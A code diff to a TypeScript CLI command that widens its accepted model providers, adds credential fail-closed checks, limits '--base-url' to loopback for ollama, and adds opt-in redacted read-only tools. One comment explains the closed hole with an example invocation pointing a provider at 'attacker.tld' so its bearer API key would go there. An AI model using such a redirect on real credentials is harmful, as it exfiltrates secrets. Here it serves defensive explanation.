@@ -1,16 +1,21 @@
 // `keryx harness run` CLI command (flow 020, T6 / AC4).
 //
-// `harnessCommand` parses `run --provider <fake|anthropic|ollama> --model <m>
-// [--base-url <url>] "<prompt>"`, selects the provider, assembles the W7
-// `runOffline` loop with real (or injected) clock/id deps + a read-only policy
-// profile, and prints ONE JSON blob `{events, text, completion, evidence}` as
-// its LAST `console.log`.
+// `harnessCommand` parses `run --provider <p> --model <m> [--base-url <url>]
+// "<prompt>"`, selects the provider, assembles the W7 `runOffline` loop with
+// real (or injected) clock/id deps + a read-only policy profile and the
+// read-only metaproject tool set, and prints ONE JSON blob
+// `{events, text, completion, evidence, tools}` as its LAST `console.log`.
 //
-// Fail-closed posture: the `anthropic` provider without `ANTHROPIC_API_KEY`
-// (read from `deps.env ?? process.env`) prints a clear message and RETURNS
-// before any network or `runOffline` call. Any thrown error from a live run is
-// caught into a structured (non-throwing) result. This command NEVER persists
-// managed flow state.
+// `<p>` is any provider the registry declares (`src/commands/providers.ts`):
+// `fake`, `anthropic`, `ollama` and every OpenAI-compatible gateway. It used to
+// be a literal three-name set here while `docs/docs/cli-reference.md` promised
+// the gateways — defect D4 of the 2026-08-05 shell benchmark.
+//
+// Fail-closed posture: a provider that requires a credential, without that
+// credential in `deps.env ?? process.env`, prints a clear message and RETURNS
+// before any network, provider construction or `runOffline` call. Any thrown
+// error from a live run is caught into a structured (non-throwing) result. This
+// command NEVER persists managed flow state.
 //
 // Determinism: `fetch`/`clock`/`idSeq`/`env` are injectable via `deps` so a test
 // invocation stays fully offline; a real CLI invocation supplies none and falls
@@ -18,7 +23,7 @@
 
 import { readFileSync, writeFileSync } from "node:fs";
 import path from "node:path";
-import { randomUUID } from "node:crypto";
+import { createHash, randomUUID } from "node:crypto";
 import type { HarnessConfig } from "../harness/config";
 import { buildHarnessScanner } from "../security/harness-scan";
 import { makeProvider } from "../harness/provider/make-provider";
@@ -57,7 +62,21 @@ import {
   resolveMasksFromSandboxEnv,
   type MaskMode,
 } from "../harness/process/sandbox/mask-resolve";
-import { OPENAI_COMPAT_PROVIDERS } from "./providers";
+import { redactForPersistence, type ScanResult } from "../harness/evidence/redaction";
+import { validateAgainstSchemaObject } from "../contracts/validator";
+import { createMetaprojectAdapter } from "../harness/tool/metaproject-adapter";
+import type { MetaprojectPort } from "../harness/tool/metaproject-port";
+import { toToolDefinitions, METAPROJECT_OPERATIONS } from "../harness/tool/metaproject-operations";
+import { builtinMetaprojectTools, makeKeryxRunner } from "../harness/tool/builtin/metaproject-tools";
+import type { ToolDefinition } from "../harness/tool/types";
+import { isLoopbackHost } from "../harness/mutation/guard";
+import {
+  OPENAI_COMPAT_PROVIDERS,
+  credentialEnvKeyFor,
+  isKnownProvider,
+  knownProviderNames,
+  providerByName,
+} from "./providers";
 import { envWithSavedApiKeys } from "../lib/shell-config";
 import { realpathSync } from "node:fs";
 import { homedir, tmpdir } from "node:os";
@@ -187,6 +206,30 @@ export interface HarnessCommandDeps {
   extensionSpec?: ExtensionCliSpec;
   /** Injected wave spec — keeps `wave` off the filesystem. */
   waveSpec?: WaveCliSpec;
+  /**
+   * Injected provider — lets a test drive `run` from a fixture transcript
+   * without a network or a credential. A real CLI invocation supplies none and
+   * `makeProvider` selects from `--provider`.
+   */
+  provider?: ProviderPort;
+  /**
+   * Injected metaproject read port backing the registered tools. A real CLI
+   * invocation supplies none and `createMetaprojectAdapter(process.cwd())` reads
+   * the workspace; a test supplies a fake so the run touches no graph on disk.
+   */
+  metaprojectPort?: MetaprojectPort;
+  /**
+   * Injected secret scanner. A real CLI invocation supplies none and
+   * `buildHarnessScanner(process.cwd())` resolves the project's detectors.
+   *
+   * SCOPE: this replaces the scanner for the WHOLE run, not just the tool-output
+   * path — the same function is handed to `runOffline` as `deps.scan` and is
+   * what redaction-before-persistence uses for every tool result the session
+   * records. It exists so the tool-output redaction branch can be exercised
+   * without planting a real secret on disk, but a test that injects a permissive
+   * stub has disabled redaction everywhere in that run, not in one branch.
+   */
+  scan?: (content: string) => ScanResult;
 }
 
 /** Resolve the shared runtime deps (env/clock/idSeq) with the run-path fallback. */
@@ -223,6 +266,8 @@ interface StructuredResult {
   text: string;
   completion: unknown;
   evidence: string[];
+  /** Every registered tool the run executed, with its redacted output. */
+  tools: HarnessToolRunRecord[];
 }
 
 interface ParsedArgs {
@@ -232,11 +277,20 @@ interface ParsedArgs {
   prompt: string;
   /** `--record <path>`: write the run's replayable hash surface to a file. */
   record?: string;
+  /** `--tools`: register the read-only metaproject tools for this run. */
+  tools: boolean;
 }
 
-/** The usage text, printed on an unknown subcommand or invalid args. */
+/**
+ * The usage text, printed on an unknown subcommand or invalid args.
+ *
+ * The provider list is GENERATED from the registry rather than typed out. A
+ * literal here would be a third place the set of accepted providers is written
+ * down (after the validation set and `docs/docs/cli-reference.md`), and the
+ * benchmark already found the first two disagreeing.
+ */
 const USAGE = [
-  'Usage: keryx harness run --provider <fake|anthropic|ollama> --model <m> [--base-url <url>] "<prompt>"',
+  `Usage: keryx harness run --provider <${knownProviderNames().join("|")}> --model <m> [--base-url <url>] [--record <path>] [--tools] "<prompt>"`,
   "       keryx harness exec [--allow-env KEY]... [--max-runtime-ms N] [--allow-real-subprocess]",
       "         [--allowed-domains a,b] [--mask-env NAME@host] [--tls-terminate] [--mask-mode auto|manual|off] [--auto-mask]",
       "         -- <path> [args...]",
@@ -251,22 +305,217 @@ function readOnlyProfile(): PolicyProfile {
 }
 
 /**
- * A minimal tool executor. Release 0 CLI runs register no tools, so a model that
- * requests one produces an unregistered call the run loop skips; this executor is
- * the fail-closed floor if one is ever reached (it never succeeds silently).
+ * Whether `--base-url <url>` may be honoured for `provider`, and why not when it
+ * may not. Returns the refusal text, or `undefined` when the base URL is allowed.
+ *
+ * The rule is one sentence: **`--base-url` is honoured only for `ollama`, and
+ * only when it names a loopback host.** Two holes closed, both newly reachable
+ * on the CI-facing surface because this command's accepted-provider set widened:
+ *
+ *  1. `--provider ollama --base-url https://any-public-host/` passed the
+ *     credential gate (ollama needs no key) and then sailed through the
+ *     provider's egress guard, which rejects private/loopback/link-local/
+ *     metadata hosts but not arbitrary public ones. "ollama (loopback)" was
+ *     documented containment that did not exist.
+ *  2. `--provider deepseek --base-url https://attacker.tld` sent
+ *     `Bearer $DEEPSEEK_API_KEY` to whatever host was named. The credential is
+ *     chosen by the provider name and the destination was not, so the two could
+ *     be pointed at different parties. A registry provider's base URL is part of
+ *     its identity; it comes from the registry.
+ *
+ * Refusal rather than silent ignoring: a flag that is accepted and discarded
+ * teaches the caller a false model of what ran.
+ *
+ * WHAT THIS DOES NOT COVER. It constrains the URL the flag names, not every
+ * host the session can reach: nothing here sets `redirect: "manual"`, so a
+ * process listening on loopback could answer with a 3xx and `fetch` would
+ * follow it to a public host. The refusal messages therefore say what the FLAG
+ * will not do, not what the session cannot do — an earlier draft said "this
+ * command will not point it at a remote host", which was a claim about the
+ * session and was not true.
+ *
+ * Left as-is deliberately. Reaching that redirect requires an attacker already
+ * running a process on the user's loopback interface — i.e. local code
+ * execution, at which point a redirect is not their cheapest option — and no
+ * credential is attached to an ollama request, so the exposure is prompt text.
+ * The fix belongs in the adapter (`OllamaProvider`), which every OpenAI-compat
+ * gateway shares, and pinning `redirect: "manual"` there would break any
+ * legitimate gateway that 3xx-es. That is a change with its own blast radius and
+ * its own tests, not a rider on this one.
+ */
+export function refuseBaseUrl(provider: string, baseUrl: string): string | undefined {
+  if (provider === "ollama") {
+    let url: URL;
+    try {
+      url = new URL(baseUrl);
+    } catch {
+      return `--base-url ${baseUrl} is not a URL. The ollama provider accepts a loopback base URL only (e.g. http://127.0.0.1:11434).`;
+    }
+    // Scheme first: a loopback HOST is not the same as an HTTP destination, and
+    // `file:`/`ftp:`/`data:` all parse to something with a hostname.
+    if (url.protocol !== "http:" && url.protocol !== "https:") {
+      return `--base-url ${baseUrl} uses the ${url.protocol.replace(":", "")} scheme; only http and https are accepted. No network was contacted.`;
+    }
+    if (!isLoopbackHost(url.hostname)) {
+      return `--base-url ${baseUrl} names ${url.hostname}, which is not loopback. The ollama provider is a LOCAL runtime and this flag will not point it at a remote host; no network was contacted.`;
+    }
+    return undefined;
+  }
+  const registryProvider = providerByName(provider);
+  if (registryProvider !== undefined) {
+    return `--base-url is not accepted for ${provider}: its base URL (${registryProvider.baseUrl}) is part of the provider's identity, and overriding it would send ${registryProvider.envKey} to a host the registry never named. No network was contacted.`;
+  }
+  return `--base-url is not accepted for ${provider}; it is honoured only for ollama, and only for a loopback host.`;
+}
+
+/**
+ * One executed tool call, as the CLI reports it.
+ *
+ * The harness `ToolResult` carries only an `outputHash` — enough to prove a
+ * result existed, useless to whatever is reading this command's stdout. So the
+ * executor keeps the (redacted) text alongside it and the command prints both.
+ * Without this, "the non-interactive door registers tools" would be a claim only
+ * a hash could support.
+ */
+export interface HarnessToolRunRecord {
+  toolCallId: string;
+  toolName: string;
+  status: "succeeded" | "failed";
+  /** The tool's output AFTER the redaction scan; never the raw protected text. */
+  output: string;
+}
+
+/** Deterministic sha-256 hex of a string (matches the harness result hashing). */
+function hashOutput(content: string): string {
+  return createHash("sha256").update(content, "utf8").digest("hex");
+}
+
+/**
+ * The executor paired with the EMPTY registry a run without `--tools` gets. The
+ * registry gate already means no call can reach it; this is the fail-closed
+ * floor if one ever did, and it never succeeds silently.
  */
 const denyingExecutor: ToolExecutorPort = {
   invoke: async (invocation: ToolInvocation): Promise<ToolResult> => {
-    throw new Error(`no tool executor is configured for the harness CLI: ${invocation.call.toolName}`);
+    throw new Error(
+      `no tool executor is configured for this run: ${invocation.call.toolName} (pass --tools to register the read-only metaproject tools)`,
+    );
   },
 };
 
-/** Parse `run --provider <p> --model <m> [--base-url <url>] "<prompt>"`. */
+/**
+ * The read-only metaproject tools, registered for a non-interactive run.
+ *
+ * This replaces the "Release 0 CLI runs register no tools" floor. It was not a
+ * safety property — the interactive shell has registered the same read-only set
+ * since flow 035 — it was an unfinished wiring: `toToolDefinitions` existed with
+ * no production consumer, so `keryx harness run` could only ever complete a
+ * single text turn (benchmark defect D3).
+ *
+ * Both halves are projections of the SAME `METAPROJECT_OPERATIONS` list:
+ * `toToolDefinitions` gives the registry the durable definitions (schemas, risk,
+ * limits), and `builtinMetaprojectTools` gives the executor the invocable side,
+ * including the `search_code` subprocess fallback and its path confinement. They
+ * are matched by operation name rather than by index, so neither projection can
+ * silently drift into executing a different tool than the one registered.
+ *
+ * `toolId` is de-namespaced from `metaproject:<name>` to `<name>`: the toolId is
+ * what the model is shown and what it must echo back, and a colon is not a legal
+ * tool name for the Anthropic API. It also keeps the non-interactive names
+ * identical to the interactive ones, so a prompt written for one door works on
+ * the other.
+ */
+function buildMetaprojectTooling(
+  cwd: string,
+  scan: (content: string) => ScanResult,
+  clock: () => string,
+  port?: MetaprojectPort,
+): { registry: ToolRegistry; executor: ToolExecutorPort; records: HarnessToolRunRecord[] } {
+  const resolvedPort = port ?? createMetaprojectAdapter(cwd);
+  const invocable = new Map(
+    builtinMetaprojectTools(cwd, makeKeryxRunner(cwd), resolvedPort).map((tool) => [
+      tool.definition.name,
+      tool,
+    ]),
+  );
+
+  const registry = new ToolRegistry();
+  const definitions = new Map<string, ToolDefinition>();
+  for (const namespaced of toToolDefinitions(METAPROJECT_OPERATIONS)) {
+    const name = namespaced.toolId.replace(/^metaproject:/, "");
+    if (!invocable.has(name)) continue;
+    const definition: ToolDefinition = { ...namespaced, toolId: name };
+    registry.register(definition);
+    definitions.set(name, definition);
+  }
+
+  const records: HarnessToolRunRecord[] = [];
+
+  const executor: ToolExecutorPort = {
+    invoke: async (invocation: ToolInvocation): Promise<ToolResult> => {
+      const { call } = invocation;
+      const definition = definitions.get(call.toolName);
+      const tool = invocable.get(call.toolName);
+      if (definition === undefined || tool === undefined) {
+        // The run loop turns a throw into a `tool-rejected` blocker with no
+        // receipt, which is the correct record for a call that never ran.
+        throw new Error(`tool "${call.toolName}" is not registered for the harness CLI`);
+      }
+
+      // The registered tool's own inline schema, checked in process. The
+      // file-based `validateToolCall` gate is not used here because it needs the
+      // frozen schema directory on disk, and an installed CLI has no reason to
+      // ship one; these operation schemas carry no cross-file `$ref`, so nothing
+      // is read from disk.
+      const inputCheck = validateAgainstSchemaObject(definition.inputSchema, call.input);
+      if (!inputCheck.valid) {
+        const detail = inputCheck.errors.map((error) => `${error.path}: ${error.message}`).join("; ");
+        throw new Error(`tool "${call.toolName}" received invalid input: ${detail}`);
+      }
+
+      const outcome = await tool.invoke(call.input);
+
+      // Same redaction the run loop applies before persistence, applied before
+      // the output reaches stdout. `search_code` can return file contents, and a
+      // piped structured result is every bit as durable as a session record.
+      const redaction = redactForPersistence(outcome.output, { scan });
+      const output = redaction.blocked ? redaction.reason : redaction.preview;
+      const status: "succeeded" | "failed" =
+        outcome.isError || redaction.blocked ? "failed" : "succeeded";
+
+      records.push({ toolCallId: call.toolCallId, toolName: call.toolName, status, output });
+
+      return {
+        schemaVersion: 1,
+        toolResultId: `result-${call.toolCallId}`,
+        executionId: `exec-${call.toolCallId}`,
+        toolCallId: call.toolCallId,
+        causal: { runId: call.runId, sessionId: call.sessionId, correlationId: call.toolCallId },
+        status,
+        outputHash: hashOutput(outcome.output),
+        ...(status === "failed"
+          ? { errorCode: redaction.blocked ? "redaction-blocked" : "tool-error" }
+          : {}),
+        redaction: redaction.blocked
+          ? ("failed-safe" as const)
+          : redaction.category === "none"
+            ? ("not-needed" as const)
+            : ("applied" as const),
+        createdAt: clock(),
+      };
+    },
+  };
+
+  return { registry, executor, records };
+}
+
+/** Parse `run --provider <p> --model <m> [--base-url <url>] [--tools] "<prompt>"`. */
 function parseArgs(args: string[]): ParsedArgs {
   let provider = "";
   let model = "";
   let baseUrl: string | undefined;
   let record: string | undefined;
+  let tools = false;
   const positional: string[] = [];
 
   // args[0] is the "run" subcommand.
@@ -280,19 +529,21 @@ function parseArgs(args: string[]): ParsedArgs {
       baseUrl = args[++i];
     } else if (arg === "--record") {
       record = args[++i];
+    } else if (arg === "--tools") {
+      tools = true;
     } else if (arg !== undefined) {
       positional.push(arg);
     }
   }
 
-  const parsed: ParsedArgs = { provider, model, prompt: positional.join(" ") };
+  const parsed: ParsedArgs = { provider, model, prompt: positional.join(" "), tools };
   if (baseUrl !== undefined) parsed.baseUrl = baseUrl;
   if (record !== undefined) parsed.record = record;
   return parsed;
 }
 
 /** Fold the terminal `RunResult` into the printed structured result. */
-function toStructured(result: RunResult): StructuredResult {
+function toStructured(result: RunResult, tools: HarnessToolRunRecord[]): StructuredResult {
   const text = result.events
     .filter((event) => event.kind === "text_delta")
     .map((event) => event.text ?? "")
@@ -302,6 +553,7 @@ function toStructured(result: RunResult): StructuredResult {
     text,
     completion: result.output.gate,
     evidence: result.output.artifacts,
+    tools,
   };
 }
 
@@ -328,15 +580,32 @@ export async function harnessCommand(args: string[], deps?: HarnessCommandDeps):
     return;
   }
 
-  const { provider, model, baseUrl, prompt, record } = parseArgs(args);
+  const { provider, model, baseUrl, prompt, record, tools } = parseArgs(args);
 
   // UX guard (flow 021, T5 / AC4): an invalid/empty --provider or an empty
   // prompt prints the usage line and returns BEFORE building input or running
   // runOffline — never a blocked/failed structured run result.
-  const validProviders = new Set(["fake", "anthropic", "ollama"]);
-  if (!validProviders.has(provider) || prompt.length === 0) {
+  //
+  // The accepted set comes from the registry (flow 135 / D4). It used to be a
+  // literal `["fake","anthropic","ollama"]`, which refused every OpenAI-compatible
+  // gateway the shell offers and that `docs/docs/cli-reference.md` already told
+  // the reader were accepted. Reading the registry means adding a provider there
+  // is the whole change: no second list to remember.
+  if (!isKnownProvider(provider) || prompt.length === 0) {
     console.log(USAGE);
     return;
+  }
+
+  // Destination guard, BEFORE the credential is read and before anything is
+  // constructed: see `refuseBaseUrl`. A refused base URL is an argument error,
+  // so it is reported ahead of the credential abort — a caller who typed a bad
+  // destination should be told about the destination, not about a key.
+  if (baseUrl !== undefined) {
+    const refusal = refuseBaseUrl(provider, baseUrl);
+    if (refusal !== undefined) {
+      console.log(refusal);
+      return;
+    }
   }
 
   const env = deps?.env ?? process.env;
@@ -345,15 +614,25 @@ export async function harnessCommand(args: string[], deps?: HarnessCommandDeps):
   const idSeq = deps?.idSeq ?? (() => `${randomUUID()}-${idCounter++}`);
   const fetchImpl = deps?.fetch ?? globalThis.fetch;
 
-  // Fail-closed BEFORE any construction/network: the anthropic provider aborts
-  // the whole command (prints + returns) when no credential is present — this
-  // command-level abort is distinct from the shell's fake fallback, so it stays
-  // here rather than in the shared factory.
-  if (provider === "anthropic") {
-    const apiKey = env.ANTHROPIC_API_KEY;
+  // Fail-closed BEFORE any construction/network: a provider that needs a
+  // credential aborts the whole command (prints + returns) when it is absent —
+  // this command-level abort is distinct from the shell's fake fallback, so it
+  // stays here rather than in the shared factory.
+  //
+  // The check is now per-provider rather than anthropic-only, because the guard
+  // above just widened what `--provider` accepts. Accepting eight more gateways
+  // while only anthropic could fail closed would have traded a usage error for a
+  // credential-less run against a hosted endpoint — a strictly worse trade, and
+  // the reason `credentialEnvKeyFor` lives beside the registry it is derived
+  // from. `fake` (never opens a socket) and `ollama` (local runtime, no key)
+  // need no credential; the destination guard above is what keeps the second one
+  // local, since needing no key is not the same as reaching nowhere.
+  const credentialEnvKey = credentialEnvKeyFor(provider);
+  if (credentialEnvKey !== undefined) {
+    const apiKey = env[credentialEnvKey];
     if (apiKey === undefined || apiKey.length === 0) {
       console.log(
-        "ANTHROPIC_API_KEY is not set: the anthropic provider is required to have a credential and fails closed (no network was contacted).",
+        `${credentialEnvKey} is not set: the ${provider} provider is required to have a credential and fails closed (no network was contacted).`,
       );
       return;
     }
@@ -363,11 +642,13 @@ export async function harnessCommand(args: string[], deps?: HarnessCommandDeps):
   // and any unrecognized name yield the offline W6 replay provider (no
   // transcripts wired in the CLI, so a missing-fixture match surfaces as a
   // caught structured result).
-  const providerPort: ProviderPort = makeProvider(provider, model, {
-    fetch: fetchImpl,
-    env,
-    ...(baseUrl !== undefined ? { baseUrl } : {}),
-  });
+  const providerPort: ProviderPort =
+    deps?.provider ??
+    makeProvider(provider, model, {
+      fetch: fetchImpl,
+      env,
+      ...(baseUrl !== undefined ? { baseUrl } : {}),
+    });
 
   const input: HarnessRunInput = {
     schemaVersion: 1,
@@ -394,11 +675,30 @@ export async function harnessCommand(args: string[], deps?: HarnessCommandDeps):
   // The real content scanner for redaction-before-persistence. Resolved here,
   // once, because the run loop is synchronous and may not read the config from
   // inside itself; without it the loop falls back to a stub that finds nothing.
-  const { scan } = await buildHarnessScanner(process.cwd());
+  const { scan } = deps?.scan !== undefined ? { scan: deps.scan } : await buildHarnessScanner(process.cwd());
+
+  // Tool registration is OPT-IN (`--tools`), and the default is OFF.
+  //
+  // Not timidity — the loop it feeds is single-turn. `runOffline` opens exactly
+  // one provider stream, executes whatever tools the model named, and returns;
+  // the results are recorded under `tools` but never appended to the messages,
+  // and there is no second request. So a model that is told about twelve tools
+  // and stops on a tool call gets no answer back and produces little or no
+  // text — degrading output for exactly the prompts tools were supposed to
+  // help with. Advertising a capability the loop cannot complete is the same
+  // over-promise this flow exists to remove, one layer down.
+  //
+  // Behind the flag it is honest and useful: the caller asked, the tool runs,
+  // and its output is in the printed blob for a script to read. The default
+  // flips when the loop learns to take a second turn, and this comment is the
+  // note to whoever does that.
+  const tooling = tools
+    ? buildMetaprojectTooling(process.cwd(), scan, clock, deps?.metaprojectPort)
+    : { registry: new ToolRegistry(), executor: denyingExecutor, records: [] as HarnessToolRunRecord[] };
   const runDeps: RunDeps = {
     provider: providerPort,
-    toolRegistry: new ToolRegistry(),
-    toolExecutor: denyingExecutor,
+    toolRegistry: tooling.registry,
+    toolExecutor: tooling.executor,
     policyProfile: readOnlyProfile(),
     clock,
     idSeq,
@@ -409,7 +709,7 @@ export async function harnessCommand(args: string[], deps?: HarnessCommandDeps):
   let structured: StructuredResult;
   try {
     const result = await runOffline(input, config, runDeps);
-    structured = toStructured(result);
+    structured = toStructured(result, tooling.records);
     if (record !== undefined && record.length > 0) {
       // Written before the structured blob is printed, so a caller that pipes
       // stdout still gets the file, and a write failure surfaces as the error
@@ -436,6 +736,10 @@ export async function harnessCommand(args: string[], deps?: HarnessCommandDeps):
       text: "",
       completion: { status: "failed", passed: false, reason: error instanceof Error ? error.message : String(error) },
       evidence: [],
+      // Whatever ran before the failure is still reported: a tool that executed
+      // and then a run that fell over is not the same thing as a run that did
+      // nothing, and the caller cannot tell them apart from an empty blob.
+      tools: tooling.records,
     };
   }
 
